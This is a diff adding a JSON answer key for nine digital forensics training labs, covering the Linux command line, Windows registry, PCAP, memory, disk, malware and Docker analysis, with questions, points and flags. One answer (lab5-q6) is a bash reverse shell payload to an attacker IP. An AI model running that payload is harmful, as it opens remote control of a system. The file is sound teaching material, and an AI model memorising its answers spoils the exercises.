@@ -1,0 +1,410 @@
+[
+  {
+    "id": 1,
+    "title": "Lab 01",
+    "description": "Introduction to digital forensics",
+    "download_url": "http://127.0.0.1:8000/Labs/lab01.zip",
+    "challenges": [
+      {
+        "id": "lab1-q1",
+        "question": "What command would we use to list all .txt files in the current directory?",
+        "points": 5,
+        "answer": "ls *.txt"
+      },
+      {
+        "id": "lab1-q2",
+        "question": "What command can we use to read the contents of the file /etc/passwd?",
+        "points": 5,
+        "answer": "cat /etc/passwd"
+      },
+      {
+        "id": "lab1-q3",
+        "question": "What command would search for the string 'Error' in all files in the /var/log directory?",
+        "points": 10,
+        "answer": "grep -r Error /var/log"
+      },
+      {
+        "id": "lab1-q4",
+        "question": "What is the command to calculate the SHA1 hash of /etc/passwd?",
+        "points": 10,
+        "answer": "sha1sum /etc/passwd"
+      },
+      {
+        "id": "lab1-q5",
+        "question": "According to the 'file' command, what is the architecture of /usr/bin/cat?",
+        "points": 10,
+        "answer": "ELF 64-bit"
+      },
+      {
+        "id": "lab1-q6",
+        "question": "What command displays all printable strings of length ≥ 8 in /bin/bash?",
+        "points": 15,
+        "answer": "strings -n 8 /bin/bash"
+      },
+      {
+        "id": "lab1-q7",
+        "question": "Based on the provided 'file' output for image.jpg, what is the actual file type?",
+        "points": 15,
+        "answer": "ELF executable"
+      },
+      {
+        "id": "lab1-q8",
+        "question": "What command finds files modified in the last 30 minutes in the /home directory?",
+        "points": 20,
+        "answer": "find /home -mmin -30"
+      },
+      {
+        "id": "lab1-q9",
+        "question": "What command displays all active TCP connections on the system?",
+        "points": 10,
+        "answer": "netstat -at"
+      },
+      {
+        "id": "lab1-q10",
+        "question": "After fixing the magic bytes of the corrupted image, what is the flag?",
+        "points": 30,
+        "answer": "flag{d1g1tal_f0r3ns1cs_101}"
+      }
+    ]
+  },
+  {
+    "id": 2,
+    "title": "Lab 02",
+    "description": "Windows Registry, NTUSER.DAT, LNK FILES, Browsers, Event logs",
+    "download_url": "http://127.0.0.1:8000/Labs/lab02.zip",
+    "challenges": [
+      {
+        "id": "lab2-q1",
+        "question": "NTUSER : What’s the mouse double-click speed?",
+        "points": 10,
+        "answer": "500"
+      },
+      {
+        "id": "lab2-q2",
+        "question": "NTUSER : What’s the most recent typed path accessed as recorded in the registry?",
+        "points": 15,
+        "answer": "C:\\Windows\\System32\\calc.exe"
+      },
+      {
+        "id": "lab2-q3",
+        "question": "NTUSER : What’s the new value added by the malware to establish persistence?",
+        "points": 25,
+        "answer": "C:\\Users\\w\\Desktop\\malware.exe"
+      },
+      {
+        "id": "lab2-q4",
+        "question": "Firefox : What’s the username and password stored in the saved logins? (Format: user:pass)",
+        "points": 20,
+        "answer": "hackerman:sup3rs3cur3p4ssw0rd"
+      },
+      {
+        "id": "lab2-q5",
+        "question": "Firefox : What’s the most frequently visited website?",
+        "points": 10,
+        "answer": "https://tryhackme.com/"
+      },
+      {
+        "id": "lab2-q6",
+        "question": "Firefox : What’s the name of the file downloaded by the suspect?",
+        "points": 15,
+        "answer": "python-3.11.1-amd64(1).exe"
+      },
+      {
+        "id": "lab2-q7",
+        "question": "Event logs : What’s the command executed by the attacker to download a file?",
+        "points": 20,
+        "answer": "Invoke-WebRequest"
+      },
+      {
+        "id": "lab2-q8",
+        "question": "Event logs : What's the purpose of the downloaded file (malware intent)?",
+        "points": 20,
+        "answer": "flag{ev3nt_l0gs_f0r_th3_w1n}"
+      }
+    ]
+  },
+  {
+    "id": 3,
+    "title": "Lab 03",
+    "description": "Macro Analysis, Document Forensics, Steganography",
+    "download_url": "http://127.0.0.1:8000/Labs/lab03.zip",
+    "challenges": [
+      {
+        "id": "lab3-q1",
+        "question": "Macro Analysis : Extract the secret embedded inside the YearlyBonus.docm macro code.",
+        "points": 30,
+        "answer": "flag{such_m4cr0_much_w0w!}"
+      },
+      {
+        "id": "lab3-q2-1",
+        "question": "PPTX Forensics: In what city this picture has been taken?",
+        "points": 20,
+        "answer": "Los Angeles"
+      },
+      {
+        "id": "lab3-q2-2",
+        "question": "PPTX Forensics: Who is the source name?",
+        "points": 10,
+        "answer": "Michael Scott"
+      },
+      {
+        "id": "lab3-q3",
+        "question": "Audio Steganography: Find the flag",
+        "points": 30,
+        "answer": "flag{h1dd3n_1n_th3_n01s3}"
+      }
+    ]
+  },
+  {
+    "id": 4,
+    "title": "Lab 04",
+    "description": "Web Server Log Analysis & Incident Response",
+    "download_url": "http://127.0.0.1:8000/Labs/lab04.zip",
+    "challenges": [
+      {
+        "id": "lab4-q1",
+        "question": "What IP address does the attack seem to be originating from?",
+        "points": 10,
+        "answer": "192.168.0.106"
+      },
+      {
+        "id": "lab4-q2",
+        "question": "Which vulnerabilities were exploited? (Format : VULN1, VULN2)",
+        "points": 25,
+        "answer": "LFI, SQLI"
+      },
+      {
+        "id": "lab4-q3",
+        "question": "What web browser and its version the attacker used ?",
+        "points": 10,
+        "answer": "Firefox/102.0"
+      },
+      {
+        "id": "lab4-q4",
+        "question": "What is the name and version of the automated tool they used ? (Format : tool/1.0)",
+        "points": 20,
+        "answer": "sqlmap/1.6.11"
+      },
+      {
+        "id": "lab4-q5",
+        "question": "Which file was the attacker trying to access but couldn't due to limited server access?",
+        "points": 15,
+        "answer": "/etc/shadow"
+      },
+      {
+        "id": "lab4-q7",
+        "question": "An important secret was compromised. Can you figure it out?",
+        "points": 30,
+        "answer": "sup3r_s3cr3t_4nd_1mp0rt4nt_p4ssw0rd"
+      },
+      {
+        "id": "lab4-q8",
+        "question": "What is the flag in the message left for the administrator ?",
+        "points": 25,
+        "answer": "flag{h1pp1ty_h0pp1ty_y0ur_w3bs1t3_1s_n0w_my_pr0ty!}"
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "title": "Lab 05",
+    "description": "Network Forensics & Traffic Analysis (PCAP)",
+    "download_url": "http://127.0.0.1:8000/Labs/lab05.pcap",
+    "challenges": [
+      {
+        "id": "lab5-q1",
+        "question": "What are the different protocols present in the captured traffic file? (Format: P1, P2, P3)",
+        "points": 10,
+        "answer": "ICMP, TCP, FTP, HTTP"
+      },
+      {
+        "id": "lab5-q2",
+        "question": "The attacker brute-forced the FTP password. What is the correct user:password found in the traffic?",
+        "points": 20,
+        "answer": "ftp:batman"
+      },
+      {
+        "id": "lab5-q3",
+        "question": "What file (TXT) was extracted from the FTP account ?",
+        "points": 15,
+        "answer": "credentials.txt"
+      },
+      {
+        "id": "lab5-q4",
+        "question": "What is the user and password found in the file ? (user:password)",
+        "points": 15,
+        "answer": "myuser:P@ssw0rd123456!"
+      },
+      {
+        "id": "lab5-q5",
+        "question": "What is the root account password discovered in the session?",
+        "points": 25,
+        "answer": "1amgr000000t!@#$"
+      },
+      {
+        "id": "lab5-q6",
+        "question": "What is the payload used for Remote Code Execution (RCE) ?",
+        "points": 35,
+        "answer": "bash -c 'bash -i >& /dev/tcp/192.168.0.106/4444 0>&1'"
+      },
+      {
+        "id": "lab5-q8",
+        "question": "What is the flag found in a root directory file ?",
+        "points": 25,
+        "answer": "flag{1_4m_gr00000t!}"
+      },
+      {
+        "id": "lab5-q9",
+        "question": "The attacker downloaded a file into /root. What is the password of the new user account ?",
+        "points": 20,
+        "answer": "b4ckd00r"
+      }
+    ]
+  },
+  {
+    "id": 6,
+    "title": "Lab 06",
+    "description": "Disk Image Analysis",
+    "download_url": "http://127.0.0.1:8000/Labs/lab06.zip",
+    "challenges": [
+      {
+        "id": "lab6-q1",
+        "question": "What are the MD5 and SHA1 hashes of the note.txt file? (Format: MD5, SHA1)",
+        "points": 10,
+        "answer": "c91e969e9184267c35ddc3ff45f795d3, c61dce75ba83f186471297e2e0568ddd0cefe022"
+      },
+      {
+        "id": "lab6-q2",
+        "question": "What is the MFT record number of the note.txt file?",
+        "points": 15,
+        "answer": "40"
+      },
+      {
+        "id": "lab6-q3",
+        "question": "What is the parent directory of the file named $Txf?",
+        "points": 20,
+        "answer": "$RmMetadata"
+      },
+      {
+        "id": "lab6-q4",
+        "question": "Determine the original Twitter URL from which meme.jpeg was downloaded.",
+        "points": 25,
+        "answer": "https://pbs.twimg.com/media/FadAHVAUUAAVp2Q?format"
+      },
+      {
+        "id": "lab6-q5",
+        "question": "Analyze the $Boot file. What is the volume serial number in raw hexadecimal format?",
+        "points": 20,
+        "answer": "7f 7a 42 44 b7 42 44 f6"
+      }
+    ]
+  },
+  {
+    "id": 7,
+    "title": "Lab 07",
+    "description": "Malware Analysis",
+    "download_url": "http://127.0.0.1:8000/Labs/lab07.zip",
+    "challenges": [
+      {
+        "id": "lab7-q1",
+        "question": "Task1 flag ?",
+        "points": 10,
+        "answer": "flag{s0m3_susp1c10us_str1ng}"
+      },
+      {
+        "id": "lab7-q2",
+        "question": "Task2 flag ?",
+        "points": 20,
+        "answer": "flag{sup3r_s1mpl3_x0r}"
+      },
+      {
+        "id": "lab7-q3",
+        "question": "Task3 flag ?",
+        "points": 20,
+        "answer": "flag{r3v3rs3_3ng1n33r1ng_1z1}"
+      },
+      {
+        "id": "lab7-q4",
+        "question": "Task4 flag ?",
+        "points": 10,
+        "answer": "flag{4_m3d10cr3_m4lw4r3_ch4ll3nge}"
+      }
+    ]
+  },
+  {
+    "id": 8,
+    "title": "Lab 08",
+    "description": "Memory Forensics",
+    "download_url": "http://127.0.0.1:8000/Labs/lab08.zip",
+    "challenges": [
+      {
+        "id": "lab8-q1",
+        "question": "What flag was found stored in the system clipboard?",
+        "points": 20,
+        "answer": "flag{s0m3_stuff_c0p13d_1n_th3_cl1pb0ard}"
+      },
+      {
+        "id": "lab8-q2",
+        "question": "The suspect performed an internet search for specific terms. What flag was hidden in the search query history?",
+        "points": 20,
+        "answer": "flag{1nt3rn3t_3xpl0r3r_h1st0ry_1n_m3m0ry_dump}"
+      },
+      {
+        "id": "lab8-q3",
+        "question": "One flag was saved within an environment variable. What is it?",
+        "points": 20,
+        "answer": "flag{3nv1r0nm3nt_v4r14bl3_c4n_4ls0_b3_3xtr4ct3d_fr0m_m3m0ry_dump}"
+      },
+      {
+        "id": "lab8-q4",
+        "question": "A flag was found in the console history. What is it?",
+        "points": 20,
+        "answer": "flag{g00d_0ld_c0ns0l3_h1st0ry}"
+      },
+      {
+        "id": "lab8-q5",
+        "question": "An image was drawn using MSPaint but never saved to disk. Reconstruct the memory to find the visual flag. What is it?",
+        "points": 50,
+        "answer": "flag{h1dd3n_1n_th3_n01s3}"
+      }
+    ]
+  },
+  {
+    "id": 9,
+    "title": "Lab 09",
+    "description": "Docker Analysis",
+    "download_url": "http://127.0.0.1:8000/Labs/lab09.zip",
+    "challenges": [
+      {
+        "id": "lab9-q1",
+        "question": "Environment flag ?",
+        "points": 10,
+        "answer": "flag{3nv1r0nm3nt_v4r1abl3s_1ns1d3_c0nta1n3rs}"
+      },
+      {
+        "id": "lab9-q2",
+        "question": "Easy flag ?",
+        "points": 10,
+        "answer": "flag{th1s_w4s_4n_34sy_0n3}"
+      },
+      {
+        "id": "lab9-q3",
+        "question": "Another easy flag ?",
+        "points": 10,
+        "answer": "flag{th1s_w4s_4n0th3r_34sy_0n3}"
+      },
+      {
+        "id": "lab9-q4",
+        "question": "Layer flag ?",
+        "points": 15,
+        "answer": "flag{dr34d_1t_run_f0r_1t_d3st1ny_4rr1v3s_4ll_7h3_s4m3}"
+      },
+      {
+        "id": "lab9-q5",
+        "question": "Secret flag ?",
+        "points": 20,
+        "answer": "flag{c0ngr4ts_0n_f1nd1ng_th3_n0t_s0_w3ll_h1dd3n_s3cr3t}"
+      }
+    ]
+  }
+]
